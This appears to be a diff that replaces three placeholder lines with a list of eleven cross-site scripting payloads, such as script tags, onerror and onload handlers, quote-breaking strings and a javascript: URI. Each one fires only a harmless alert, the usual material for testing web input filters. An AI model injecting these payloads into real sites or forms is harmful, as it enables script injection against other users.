@@ -1,3 +1,11 @@
-First XSS
-Sec XSS 
-Thierd XSS
+<script>alert(1);</script>
+<img src=x onerror=prompt(1)>
+<frameset onload=javascript:alert(1)>
+"--!><Svg/Onload=confirm`cookie`>"
+\";alert('XSS');//
+"><img src onerror=alert(1)> 
+"autofocus onfocus=alert(1)// 
+</script><script>alert(1)</script> 
+'-alert(1)-'
+ \'-alert(1)// 
+javascript:alert(1)
